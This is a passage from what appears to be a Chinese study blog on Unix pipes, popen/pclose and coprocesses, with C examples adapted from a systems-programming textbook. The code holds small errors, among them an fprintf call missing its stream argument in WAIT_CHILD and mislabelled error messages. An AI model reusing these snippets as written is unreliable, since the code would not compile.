class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> pfd1[<span class="hljs-number">2</span>], pfd2[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">TELL_WAIT</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(pipe(pfd1) &lt; <span class="hljs-number">0</span> || pipe(pfd2) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//初始化两个管道</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;pipe error!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//pfd2父进程写，子进程读</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">TELL_PARENT</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (write(pfd2[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>) != <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">WAIT_PARENT</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> c;<br>    <span class="hljs-keyword">if</span> (read(pfd1[<span class="hljs-number">0</span>], &amp;c, <span class="hljs-number">1</span>) != <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;read error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;p&#x27;</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;WAIT_PARENT: incorrect data&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//pfd1为子进程写，父进程读</span><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">TELL_CHILD</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(write(pfd1[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-number">1</span>) != <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">WAIT_CHILD</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> c;<br>    <span class="hljs-keyword">if</span> (read(pfd2[<span class="hljs-number">0</span>], &amp;c, <span class="hljs-number">1</span>) != <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;read error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&#x27;c&#x27;</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-string">&quot;WAIT_CHILD: incorrect data&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="popen-和-pclose"><a href="#popen-和-pclose" class="headerlink" title="popen 和 pclose"></a>popen 和 pclose</h2><p><code>popen</code>用于创建管道、<code>fork</code>子管道、关闭管道未使用的端、执行<code>shell</code>命令以及等待命令终止。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br>FILE *<span class="hljs-title function_">popen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmdstring, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *type)</span>;<br>Returns:file pointer <span class="hljs-keyword">if</span> OK, <span class="hljs-literal">NULL</span> on error<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pclose</span><span class="hljs-params">(FILE *fp)</span>;<br>Returns:termination status of cmdstring, or <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><ul><li><code>type = r</code>则父进程连接子进程的标准输出流</li></ul><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230208184650475.png" alt="image-20230208184650475"></p><ul><li><code>type = w</code>则父进程连接子进程的标准输入流</li></ul><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230208184714204.png" alt="image-20230208184714204"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGER <span class="hljs-string">&quot;$&#123;PAGER:-more&#125;&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 1024</span><br><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">char</span> line[MAXLINE];<br>    FILE  *fpin, *fpout;<br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: a.out &lt;pathname&gt;&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((fpin = fopen(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t open %s&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((fpout = popen(PAGER, <span class="hljs-string">&quot;w&quot;</span>)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;popen error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (fgets(line, MAXLINE, fpin) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fputs</span>(line, fpout) == EOF)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fputs error to pipe&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ferror(fpin))<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fgets error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (pclose(fpout) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;pclose error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>使用管道实现字符大小写转换</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -o myuclc 15-14.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> c;<br><br>    <span class="hljs-keyword">while</span> ((c = getchar()) != EOF)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isupper</span>(c))<br>            c = <span class="hljs-built_in">tolower</span>(c);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">putchar</span>(c) == EOF)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;output error\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>            fflush(<span class="hljs-built_in">stdout</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -o 15-15 15-15.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 1024</span><br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> line[MAXLINE];<br>    FILE *fpin;<br>    <span class="hljs-keyword">if</span> ((fpin = popen(<span class="hljs-string">&quot;./myuclc&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;popen error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(;;)&#123;<br>        <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;prompt&gt; &quot;</span>,<span class="hljs-built_in">stdout</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-keyword">if</span> (fgets(line, MAXLINE, fpin) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fputs</span>(line, <span class="hljs-built_in">stdout</span>) == EOF)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fputs error to pipe&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pclose(fpin) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;pclose error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="协作进程"><a href="#协作进程" class="headerlink" title="协作进程"></a>协作进程</h2><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20230209010328935.png" alt="image-20230209010328935"></p><p><strong>使用协作进程实现加法</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 1024</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> n, int1, int2;<br>    <span class="hljs-type">char</span> line[MAXLINE];<br><br>    <span class="hljs-keyword">while</span> ((n = read(STDIN_FILENO, line, MAXLINE)) &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        line[n] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">&quot;%d%d&quot;</span>, &amp;int1, &amp;int2) == <span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-built_in">sprintf</span>(line, <span class="hljs-string">&quot;%d\n&quot;</span>, int1 + int2);<br>            n = <span class="hljs-built_in">strlen</span>(line);<br>            <span class="hljs-keyword">if</span> (write(STDOUT_FILENO, line, n) != n)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125; <br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (write(STDOUT_FILENO, <span class="hljs-string">&quot;invalid args\n&quot;</span>,<span class="hljs-number">13</span>) != <span class="hljs-number">13</span>)<br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                &#125;<br>            &#125;<br>        <br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 1024</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sig_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> n, fd1[<span class="hljs-number">2</span>], fd2[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">char</span> line[MAXLINE];<br><br>    <span class="hljs-keyword">if</span> (signal(SIGPIPE, sig_pipe) == SIG_ERR) <span class="hljs-comment">//注册信号处理</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;signal error!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (pipe(fd1) &lt; <span class="hljs-number">0</span> || pipe(fd2) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//建立两个管道</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork error!\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>)&#123; <span class="hljs-comment">//父进程</span><br>        close(fd1[<span class="hljs-number">0</span>]); <span class="hljs-comment">//fd1写</span><br>        close(fd2[<span class="hljs-number">1</span>]); <span class="hljs-comment">//fd2读</span><br><br>        <span class="hljs-keyword">while</span> (fgets(line, MAXLINE, <span class="hljs-built_in">stdin</span>) != <span class="hljs-literal">NULL</span>)&#123;<br>            n = <span class="hljs-built_in">strlen</span>(line);<br>            <span class="hljs-keyword">if</span> (write(fd1[<span class="hljs-number">1</span>], line, n) != n) <span class="hljs-comment">//向管道中写数据</span><br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error to pipe\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((n = read(fd2[<span class="hljs-number">0</span>], line, MAXLINE)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//从管道中读数据</span><br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;read error from pipe&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-comment">//管道被关闭</span><br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;child closed pipe&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            line[n] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fputs</span>(line, <span class="hljs-built_in">stdout</span>) == EOF)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fputs error&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (ferror(<span class="hljs-built_in">stdin</span>))<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fgets error on stdin&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//子进程</span><br>        close(fd1[<span class="hljs-number">1</span>]); <span class="hljs-comment">//fd1为读</span><br>        close(fd2[<span class="hljs-number">0</span>]); <span class="hljs-comment">//fd2为写</span><br>        <span class="hljs-keyword">if</span> (fd1[<span class="hljs-number">0</span>] != STDIN_FILENO) &#123;<br>            <span class="hljs-keyword">if</span> (dup2(fd1[<span class="hljs-number">0</span>], STDIN_FILENO) != STDIN_FILENO)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dup2 error to stdin&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            close(fd1[<span class="hljs-number">0</span>]);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fd2[<span class="hljs-number">1</span>] != STDOUT_FILENO)&#123;<br>            <span class="hljs-keyword">if</span> (dup2(fd2[<span class="hljs-number">1</span>], STDOUT_FILENO) != STDOUT_FILENO)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dup2 error to stdout&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            close(fd2[<span class="hljs-number">1</span>]);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (execl(<span class="hljs-string">&quot;./add2&quot;</span>, <span class="hljs-string">&quot;add2&quot;</span>, (<span class="hljs-type">char</span> *)<span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;execl error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;  <br>    &#125;<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">sig_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;SIGPIPE caught\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>改写add2文件，使用标准I&#x2F;O库函数实现对管道的读写，会造成死锁</strong></p><figure class="highlight 